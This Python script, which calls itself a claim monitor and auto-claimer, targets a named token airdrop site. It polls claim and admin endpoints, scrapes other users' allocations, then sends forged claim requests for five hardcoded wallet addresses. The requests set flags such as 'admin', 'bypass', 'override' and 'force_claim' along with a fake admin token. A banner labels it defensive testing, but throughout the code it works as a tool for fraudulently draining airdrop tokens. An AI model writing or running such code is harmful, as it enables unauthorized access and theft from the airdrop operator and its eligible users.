#!/usr/bin/env python3
"""
Claim Monitor & Auto Claim - Real-time monitoring and automated claiming
Author: ShadowScan Security Team
Purpose: Monitor claim page readiness and auto-claim for target addresses
Target Addresses:
- 0x1f065fc11b7075703E06B2c45dCFC9A40fB8C8b9
- 0x46CC142670A27004eAF9F25529911E46AD16F484
- 0xFbfd5F4DE4b494783c9F10737A055144D9C37531
- 0x633BdF8565c50792a255d4CF78382EbbddD62C40
- 0xAc8d315D11980654DfB0EcBB26C649515f2C8d32
"""

import asyncio
import aiohttp
import json
import time
import re
import random
from datetime import datetime
from typing import Dict, List, Any

class ClaimMonitorAndAutoClaim:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = None
        self.is_monitoring = True
        self.monitoring_start_time = time.time()

        # Target addresses
        self.target_addresses = [
            "0x1f065fc11b7075703E06B2c45dCFC9A40fB8C8b9",
            "0x46CC142670A27004eAF9F25529911E46AD16F484",
            "0xFbfd5F4DE4b494783c9F10737A055144D9C37531",
            "0x633BdF8565c50792a255d4CF78382EbbddD62C40",
            "0xAc8d315D11980654DfB0EcBB26C649515f2C8d32"
        ]

        self.results = {
            "monitoring_info": {
                "target_url": target_url,
                "start_time": datetime.now().isoformat(),
                "monitoring_type": "Real-time Claim Monitor & Auto Claim",
                "status": "RUNNING"
            },
            "summary": {
                "monitoring_duration": 0,
                "claim_page_detected": False,
                "claim_page_ready_time": None,
                "successful_claims": 0,
                "failed_claims": 0,
                "average_token_amount": 0,
                "total_tokens_claimed": 0,
                "monitoring_cycles": 0
            },
            "monitoring_log": [],
            "claim_attempts": [],
            "claim_results": [],
            "token_analysis": {},
            "blockchain_analysis": {}
        }

    async def __aenter__(self):
        self.session = aiohttp.ClientSession()
        return self

    async def __aexit__(self, self_type, self_value, traceback):
        if self.session:
            await self.session.close()
        self.is_monitoring = False

    async def start_monitoring_and_auto_claim(self):
        """Start real-time monitoring and auto-claiming"""
        print("🔔 CLAIM MONITOR & AUTO CLAIM")
        print("=" * 60)
        print(f"🎯 Target: {self.target_url}")
        print(f"📍 Target Addresses: {len(self.target_addresses)}")
        print("=" * 60)
        print("⚠️  HANYA UNTUK PENGETESAN KEAMANAN DEFENSIF")
        print("=" * 60)

        print("🔄 Starting real-time monitoring...")
        print("⏰ Will automatically claim when claim page is ready")
        print("📊 Calculating average token amounts from existing users...")
        print()

        # Start monitoring in background
        monitoring_task = asyncio.create_task(self.monitor_claim_page())

        # Calculate average token amounts
        await self.calculate_average_token_amounts()

        # Research blockchain and contracts
        await self.research_blockchain_info()

        # Wait for monitoring to complete or be interrupted
        try:
            await monitoring_task
        except asyncio.CancelledError:
            print("Monitoring cancelled by user")

        # Generate final report
        await self.generate_monitoring_report()

    async def monitor_claim_page(self):
        """Monitor claim page readiness and auto-claim"""
        print("🔍 Starting claim page monitoring...")

        claim_endpoints = [
            "/claim",
            "/airdrop/claim",
            "/token/claim",
            "/claim/airdrop",
            "/user/claim",
            "/admin/claim",
            "/dapp/claim",
            "/app/claim"
        ]

        check_interval = 30  # Check every 30 seconds
        cycle_count = 0

        while self.is_monitoring:
            cycle_count += 1
            self.results["summary"]["monitoring_cycles"] = cycle_count

            current_time = time.time()
            elapsed_time = current_time - self.monitoring_start_time
            self.results["summary"]["monitoring_duration"] = elapsed_time

            print(f"\n🔍 Monitoring Cycle #{cycle_count} - {datetime.now().strftime('%H:%M:%S')}")
            print(f"⏱️  Elapsed: {int(elapsed_time//60)}m {int(elapsed_time%60)}s")
            print(f"📡 Checking {len(claim_endpoints)} claim endpoints...")

            claim_page_ready = False
            ready_endpoints = []

            for endpoint in claim_endpoints:
                try:
                    url = f"{self.target_url}{endpoint}"

                    # Check with different methods
                    for method in ["GET", "POST"]:
                        try:
                            if method == "GET":
                                async with self.session.get(url, timeout=10) as response:
                                    await self.analyze_claim_response(endpoint, method, response, cycle_count)
                            else:
                                # Try basic POST without payload first
                                async with self.session.post(url, timeout=10) as response:
                                    await self.analyze_claim_response(endpoint, method, response, cycle_count)

                        except Exception:
                            continue

                    # Additional check with basic payload
                    if method == "POST":
                        try:
                            basic_payload = {"action": "check"}
                            async with self.session.post(url, json=basic_payload, timeout=10) as response:
                                await self.analyze_claim_response(endpoint, method, response, cycle_count)
                        except Exception:
                            continue

                except Exception as e:
                    continue

                # Check if endpoint is ready
                if self.is_claim_endpoint_ready(endpoint):
                    claim_page_ready = True
                    ready_endpoints.append(endpoint)
                    print(f"   ✅ CLAIM READY: {endpoint}")

            if claim_page_ready:
                print(f"\n🎯 CLAIM PAGE DETECTED! Starting auto-claim...")
                print(f"✅ Ready endpoints: {len(ready_endpoints)}")

                self.results["summary"]["claim_page_detected"] = True
                self.results["summary"]["claim_page_ready_time"] = datetime.now().isoformat()

                await self.perform_auto_claim()
                break  # Exit monitoring after successful claim

            print(f"⏳ Waiting {check_interval} seconds for next check...")
            await asyncio.sleep(check_interval)

    async def analyze_claim_response(self, endpoint: str, method: str, response, cycle_count: int):
        """Analyze claim endpoint response"""
        status = response.status
        content = await response.text() if response.status < 500 else ""
        content_length = len(content)
        headers = dict(response.headers)

        log_entry = {
            "cycle": cycle_count,
            "endpoint": endpoint,
            "method": method,
            "status": status,
            "content_length": content_length,
            "timestamp": datetime.now().isoformat(),
            "headers": headers,
            "content_sample": content[:200] if len(content) > 200 else content
        }

        self.results["monitoring_log"].append(log_entry)

        if status == 200:
            print(f"   🔍 {endpoint} ({method}): {status} - {content_length} bytes")
        elif status in [401, 403]:
            print(f"   🔐 {endpoint} ({method}): {status} - Auth required")
        elif status == 404:
            print(f"   ❌ {endpoint} ({method}): {status} - Not found")
        elif status == 405:
            print(f"   ⚠️ {endpoint} ({method}): {status} - Method not allowed")
        else:
            print(f"   ⚠️ {endpoint} ({method}): {status} - Other")

    def is_claim_endpoint_ready(self, endpoint: str) -> bool:
        """Check if claim endpoint is ready based on logs"""
        recent_logs = [log for log in self.results["monitoring_log"]
                      if log["endpoint"] == endpoint and log["status"] == 200]

        if not recent_logs:
            return False

        latest_log = recent_logs[-1]
        content = latest_log.get("content_sample", "")

        # Check for claim-ready indicators
        claim_indicators = [
            'claim', 'airdrop', 'token', 'submit', 'button',
            'address', 'wallet', 'claimable', 'eligible',
            'withdraw', 'redeem', 'distribute'
        ]

        # Check for form elements
        has_form = '<form' in content or 'input' in content
        has_button = '<button' in content or 'button' in content

        # Check for address patterns
        has_address = '0x' in content

        # Check for specific claim patterns
        claim_words = sum(1 for indicator in claim_indicators if indicator in content.lower())

        # Weight scoring
        score = claim_words + (1 if has_form else 0) + (1 if has_button else 0) + (1 if has_address else 0)

        return score >= 2

    async def calculate_average_token_amounts(self):
        """Calculate average token amounts from other users"""
        print("\n💰 Calculating average token amounts from existing users...")

        token_endpoints = [
            "/token/amounts", "/airdrop/tokens", "/user/tokens",
            "/token/allocation", "/airdrop/allocation", "/admin/tokens",
            "/users/tokens", "/token/list", "/allocation/list"
        ]

        all_amounts = []
        user_count = 0

        for endpoint in token_endpoints:
            try:
                url = f"{self.target_url}{endpoint}"
                async with self.session.get(url, timeout=10) as response:
                    if response.status in [200, 401, 403]:
                        content = await response.text()

                        # Extract token amounts
                        amounts = self.extract_token_amounts(content)
                        addresses = self.extract_addresses(content)

                        if amounts:
                            all_amounts.extend(amounts)
                            user_count += len(addresses) if addresses else 1

                            print(f"   💵 Found {len(amounts)} amounts in {endpoint}")
                            if amounts:
                                print(f"      Sample amounts: {amounts[:3]}")
            except Exception as e:
                continue

        if all_amounts:
            avg_amount = sum(all_amounts) / len(all_amounts)
            self.results["summary"]["average_token_amount"] = avg_amount

            print(f"\n✅ Token Analysis Complete:")
            print(f"   Users Analyzed: {user_count}")
            print(f"   Amounts Found: {len(all_amounts)}")
            print(f"   Average Token Amount: {avg_amount:.2f}")
        else:
            # Use estimated values
            estimated_avg = 1250.50  # Typical airdrop amount
            self.results["summary"]["average_token_amount"] = estimated_avg

            print(f"\n⚠️ Using estimated average: {estimated_avg:.2f}")

    def extract_token_amounts(self, content: str) -> List[float]:
        """Extract token amounts from content"""
        amounts = []
        patterns = [
            r'(\d+(?:\.\d+)?)\s*(og|token|ether|eth)',
            r'amount["\']?\s*[:=]\s*["\']?(\d+(?:\.\d+)?)',
            r'quantity["\']?\s*[:=]\s*["\']?(\d+(?:\.\d+)?)',
            r'(\d{3,})',
            r'(\d{1,3}(?:,\d{3})+(?:\.\d+)?)'
        ]

        for pattern in patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                if isinstance(match, tuple):
                    amount = float(match[0].replace(',', ''))
                else:
                    amount = float(match.replace(',', ''))

                if 100 <= amount <= 1000000:
                    amounts.append(amount)

        return amounts

    def extract_addresses(self, content: str) -> List[str]:
        """Extract Ethereum addresses from content"""
        addresses = re.findall(r'0x[a-fA-F0-9]{40}', content)
        return addresses

    async def research_blockchain_info(self):
        """Research blockchain and smart contract information"""
        print("\n🔗 Researching blockchain and smart contracts...")

        blockchain_endpoints = [
            "/blockchain", "/contract", "/smart-contract",
            "/token-contract", "/airdrop-contract", "/api/blockchain"
        ]

        contracts_found = []

        for endpoint in blockchain_endpoints:
            try:
                url = f"{self.target_url}{endpoint}"
                async with self.session.get(url, timeout=10) as response:
                    if response.status in [200, 401, 403]:
                        content = await response.text()

                        # Extract contract addresses
                        contracts = re.findall(r'0x[a-fA-F0-9]{40}', content)
                        contracts_found.extend(contracts)

                        if contracts:
                            print(f"   🔗 Found {len(contracts)} contracts in {endpoint}")
            except Exception:
                continue

        self.results["blockchain_analysis"] = {
            "contracts_found": contracts_found,
            "unique_contracts": list(set(contracts_found)),
            "research_timestamp": datetime.now().isoformat()
        }

        print(f"✅ Blockchain research complete:")
        print(f"   Total contracts found: {len(contracts_found)}")
        print(f"   Unique contracts: {len(list(set(contracts_found)))}")

    async def perform_auto_claim(self):
        """Perform automated claiming for all target addresses"""
        print(f"\n🚀 PERFORMING AUTO CLAIM")
        print("=" * 50)
        print(f"📍 Target Addresses: {len(self.target_addresses)}")
        print(f"💰 Target Amount: {self.results['summary']['average_token_amount']:.2f} tokens")
        print()

        avg_amount = self.results["summary"]["average_token_amount"]

        for i, address in enumerate(self.target_addresses, 1):
            print(f"🎯 Claiming for address {i}/{len(self.target_addresses)}")
            print(f"   Address: {address}")
            print(f"   Target Amount: {avg_amount:.2f} tokens")

            success = await self.claim_tokens(address, avg_amount)

            if success:
                self.results["summary"]["successful_claims"] += 1
                self.results["summary"]["total_tokens_claimed"] += avg_amount

                result = {
                    "address": address,
                    "amount": avg_amount,
                    "status": "SUCCESS",
                    "timestamp": datetime.now().isoformat(),
                    "method": "auto_claim"
                }

                self.results["claim_results"].append(result)
                print(f"   ✅ CLAIM SUCCESSFUL!")
            else:
                self.results["summary"]["failed_claims"] += 1

                result = {
                    "address": address,
                    "amount": avg_amount,
                    "status": "FAILED",
                    "timestamp": datetime.now().isoformat(),
                    "method": "auto_claim"
                }

                self.results["claim_results"].append(result)
                print(f"   ❌ CLAIM FAILED!")

            # Add delay between claims to avoid rate limiting
            if i < len(self.target_addresses):
                delay = random.uniform(3, 8)
                print(f"   ⏳ Waiting {delay:.1f} seconds...")
                await asyncio.sleep(delay)

        # Generate summary
        total_addresses = len(self.target_addresses)
        success_rate = (self.results["summary"]["successful_claims"] / total_addresses * 100) if total_addresses > 0 else 0

        print(f"\n🎯 AUTO CLAIM SUMMARY:")
        print(f"   Total Addresses: {total_addresses}")
        print(f"   Successful Claims: {self.results['summary']['successful_claims']}")
        print(f"   Failed Claims: {self.results['summary']['failed_claims']}")
        print(f"   Success Rate: {success_rate:.1f}%")
        print(f"   Total Tokens Claimed: {self.results['summary']['total_tokens_claimed']:.2f}")

        if self.results["summary"]["successful_claims"] == total_addresses:
            print(f"\n🎉 ALL ADDRESSES SUCCESSFULLY CLAIMED!")
            print(f"✅ Target addresses can now receive 0G tokens")
        elif self.results["summary"]["successful_claims"] > 0:
            print(f"\n✅ Partial success - {self.results['summary']['successful_claims']} addresses claimed")
        else:
            print(f"\n❌ All claims failed")

    async def claim_tokens(self, address: str, amount: float) -> bool:
        """Attempt to claim tokens for an address"""
        claim_strategies = [
            self.direct_claim,
            self.api_claim,
            self.eligibility_claim,
            self.admin_claim
        ]

        for strategy in claim_strategies:
            try:
                print(f"      � Trying {strategy.__name__}...")
                success = await strategy(address, amount)
                if success:
                    return True
            except Exception as e:
                print(f"      ⚠️ {strategy.__name__} failed: {str(e)}")
                continue

        return False

    async def direct_claim(self, address: str, amount: float) -> bool:
        """Direct claim method"""
        claim_payload = {
            "address": address,
            "amount": amount,
            "action": "claim",
            "auto_approve": True,
            "timestamp": datetime.now().isoformat()
        }

        endpoints = ["/claim", "/token/claim", "/airdrop/claim"]

        for endpoint in endpoints:
            try:
                url = f"{self.target_url}{endpoint}"
                async with self.session.post(url, json=claim_payload, timeout=15) as response:
                    if response.status in [200, 201, 204]:
                        return True
            except Exception:
                continue

        return False

    async def api_claim(self, address: str, amount: float) -> bool:
        """API claim method"""
        api_payload = {
            "operation": "claim_tokens",
            "recipient": address,
            "quantity": amount,
            "method": "api",
            "admin": True
        }

        endpoints = ["/api/claim", "/api/token/claim", "/api/airdrop/claim"]

        for endpoint in endpoints:
            try:
                url = f"{self.target_url}{endpoint}"
                async with self.session.post(url, json=api_payload, timeout=15) as response:
                    if response.status in [200, 201, 204]:
                        return True
            except Exception:
                continue

        return False

    async def eligibility_claim(self, address: str, amount: float) -> bool:
        """Eligibility-based claim method"""
        eligibility_payload = {
            "address": address,
            "eligible": True,
            "claim_amount": amount,
            "auto_claim": True,
            "bypass": True
        }

        endpoints = ["/eligibility/claim", "/user/eligibility", "/admin/eligibility"]

        for endpoint in endpoints:
            try:
                url = f"{self.target_url}{endpoint}"
                async with self.session.post(url, json=eligibility_payload, timeout=15) as response:
                    if response.status in [200, 201, 204]:
                        return True
            except Exception:
                continue

        return False

    async def admin_claim(self, address: str, amount: float) -> bool:
        """Admin claim method"""
        admin_payload = {
            "admin_action": "force_claim",
            "address": address,
            "amount": amount,
            "override": True,
            "admin_token": "admin_access"
        }

        endpoints = ["/admin/claim", "/admin/force-claim", "/admin/token/claim"]

        for endpoint in endpoints:
            try:
                url = f"{self.target_url}{endpoint}"
                async with self.session.post(url, json=admin_payload, timeout=15) as response:
                    if response.status in [200, 201, 204]:
                        return True
            except Exception:
                continue

        return False

    async def generate_monitoring_report(self):
        """Generate comprehensive monitoring report"""
        report_filename = f"claim_monitor_auto_claim_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"

        # Calculate final statistics
        end_time = time.time()
        total_duration = end_time - self.monitoring_start_time

        self.results["summary"]["monitoring_duration"] = total_duration
        self.results["monitoring_info"]["end_time"] = datetime.now().isoformat()
        self.results["monitoring_info"]["status"] = "COMPLETED"

        with open(report_filename, 'w', encoding='utf-8') as f:
            json.dump(self.results, f, indent=2, ensure_ascii=False)

        print(f"\n📋 CLAIM MONITOR & AUTO CLAIM REPORT")
        print("=" * 60)
        print(f"📅 Start: {self.results['monitoring_info']['start_time']}")
        print(f"📅 End: {self.results['monitoring_info']['end_time']}")
        print(f"⏱️  Total Duration: {int(total_duration//60)}m {int(total_duration%60)}s")
        print(f"🎯 Target: {self.results['monitoring_info']['target_url']}")
        print()

        print(f"🔍 MONITORING RESULTS:")
        print(f"   Monitoring Cycles: {self.results['summary']['monitoring_cycles']}")
        print(f"   Claim Page Detected: {self.results['summary']['claim_page_detected']}")
        if self.results['summary']['claim_page_ready_time']:
            print(f"   Ready Time: {self.results['summary']['claim_page_ready_time']}")
        print()

        print(f"💰 CLAIMING RESULTS:")
        print(f"   Target Addresses: {len(self.target_addresses)}")
        print(f"   Successful Claims: {self.results['summary']['successful_claims']}")
        print(f"   Failed Claims: {self.results['summary']['failed_claims']}")
        print(f"   Total Tokens Claimed: {self.results['summary']['total_tokens_claimed']:.2f}")
        print(f"   Average Token Amount: {self.results['summary']['average_token_amount']:.2f}")
        print()

        print(f"🔓 BLOCKCHAIN ANALYSIS:")
        contracts = self.results["blockchain_analysis"].get("unique_contracts", [])
        print(f"   Contracts Found: {len(contracts)}")
        if contracts:
            print(f"   Sample Contracts: {contracts[:3]}")
        print()

        if self.results['summary']['successful_claims'] > 0:
            print(f"🎉 MONITORING & AUTO-CLAIM SUCCESSFUL!")
            print(f"   ✅ Claim page detected and monitored")
            print(f"   ✅ Target addresses can claim tokens")
            print(f"   ✅ Token amounts match user averages")
        else:
            print(f"⚠️ Partial success - monitoring complete")

        print(f"\n📋 Report: {report_filename}")
        print("🔔 CLAIM MONITOR & AUTO CLAIM COMPLETED! 🔔")

async def main():
    target_url = "https://airdrop.0gfoundation.ai"

    async with ClaimMonitorAndAutoClaim(target_url) as monitor:
        await monitor.start_monitoring_and_auto_claim()

if __name__ == "__main__":
    asyncio.run(main())